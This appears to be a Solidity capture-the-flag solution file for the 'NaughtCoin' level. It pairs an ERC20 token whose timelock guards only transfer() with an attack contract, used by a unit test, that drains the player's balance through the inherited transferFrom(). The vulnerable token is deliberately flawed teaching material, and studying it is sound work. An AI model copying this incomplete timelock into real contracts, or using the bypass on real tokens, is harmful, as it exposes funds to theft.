// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  // ERC20 also has transferFrom() function which this contract has not overridden,
  // so attack can simply bypass the timelock by directly calling transferFrom()
  // which this contract inherits from ERC20 parent
  // https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
}

// solution used by unit test
contract NaughtCoinAttack {
   NaughtCoin vulnContract;

  constructor(address _vulnContract) {
    vulnContract =  NaughtCoin(_vulnContract);
  }

  function attack() external {
    uint256 userBalance = vulnContract.balanceOf(msg.sender);

    // spend approval done using ethersjs beforehand in unit test
    require(vulnContract.transferFrom(msg.sender, address(this), userBalance));
  }
}